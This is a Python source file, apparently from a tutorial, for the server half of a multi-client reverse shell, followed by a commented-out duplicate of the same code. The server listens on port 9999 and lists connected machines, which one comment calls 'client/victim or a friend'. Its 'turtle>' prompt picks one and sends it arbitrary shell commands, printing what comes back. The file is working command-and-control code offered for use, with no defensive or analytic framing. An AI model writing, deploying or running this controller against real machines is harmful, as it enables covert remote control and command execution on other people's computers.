import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir


def start_turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")


# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()


# import socket
# import sys
# import threading
# import time
# from queue import Queue

# NUMBER_OF_THREADS = 2
# JOB_NUMBER = [1,2]
# queue = Queue()
# all_connections = []
# all_addresses = []


# # 1st Thread func - 1) Create Socket 2) Bind Socket 3) Accept Connections
# # Create a Socket
# def create_socket():
#     try:
#         # We will declare global var to be able to access them outside the func
#         global host
#         global port
#         global s  # socket
#         host = ""  # will pop later
#         port = 9999  # we will use 9999 as it is not popular
#         s = socket.socket()  # create a socket object
#     except socket.error as msg:
#         print("Socket creation error: " + str(msg))


# # Bind the socket
# def bind_socket():
#     try:
#         global host
#         global port
#         global s

#         print("Binding the Port " + str(port))

#         s.bind((host, port))  # .bind is a socket method thats a tuple
#         s.listen(5)  # allow 5 connections
#     except socket.error as msg:
#         print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
#         bind_socket()  # if error, try again


# # Handling connection from multiple clients and saving it to a list
# # Closing previous connections when server.py file is restarted

# def accepting_connection():
#     for c in all_connections:
#         c.close()

#     del all_connections[:]
#     del all_addresses[:]

#     while True:
#         try:
#             conn, address = s.accept()
#             s.setblocking(1)  # set the socket to blocking mode prevent timeout from happening

#             all_connections.append(conn)
#             all_addresses.append(address)

#             print("Connection has been established | IP: " + address[0])  #  + " | Port: " + str(address[1])
#             # handle_client_connection(conn, address)
#         except:
#             print("Error accepting connections")

# # 2nd Thread func - 1) See all clients 2) Select client 3) Send command
# # Interactive prompt for sending commands - shell named turtle
# # turtle> command
# # list = ID port

# def start_turtle():    
#     while True:
#         cmd = input('turtle> ')
#         if cmd == 'list':
#             list_connections()

#         elif 'select' in cmd:
#             conn = get_target(cmd)
#             if conn is not None:
#                 send_target_commands(conn)
#         else:
#             print("Invalid command")


# # Display all current active connections with the client

# def list_connections():
#     results = ""

#     for i, conn in enumerate(all_connections):
#         try:
#             conn.send(str.encode(" "))
#             conn.recv(20480)
#         except:
#             del all_connections[i]
#             del all_addresses[i]
#             continue

#         results = str(i) + "  " + str(all_addresses[i][0]) + "  " + str(all_addresses[i][1]) + "\n"

#     print("----Clients----" + "\n" + results)

# # Get target client
# def get_target(cmd):
#     try:
#         target = cmd.replace("select ", "")  # target is the id of the connection
#         target = int(target)
#         conn = all_connections[target]
#         print("You are now connected to " + str(all_addresses[target][0]))
#         print(str(all_addresses[target][0]) + ">", end="")  # 192.168.1.1>
#         return conn
#     except:
#         print("Selection not valid")
#         return None

# # Send commands to the target client
# def send_target_commands(conn):
#     while True:
#         try:
#             cmd = input()
#             if cmd == "quit":
#                 break

#             if len(str.encode(cmd)) > 0:
#                 conn.send(str.encode(cmd))
#                 client_response = str(conn.recv(20480), "utf-8")
#                 print(client_response, end="")
#         except:
#             print("Error sending command")
#             break

# # Create worker threads
# def create_workers():
#     for _ in range(NUMBER_OF_THREADS):
#         t = threading.Thread(target=work)  # create a worker thread
#         t.daemon = True  # Daemonize thread - end thread when done to save memory
#         t.start()


# # Do next job in queue (handle connections, send commands)
# def work():
#     while True:
#         x = queue.get()
#         if x == 1:
#             create_socket()
#             bind_socket()
#             accepting_connection()

#         if x == 2:
#             start_turtle()

#         queue.task_done()


# # Create Jobs
# def create_jobs():
#     for x in JOB_NUMBER:
#         queue.put(x)  # add job to the queue
    
#     queue.join()


# create_workers()
# create_jobs()
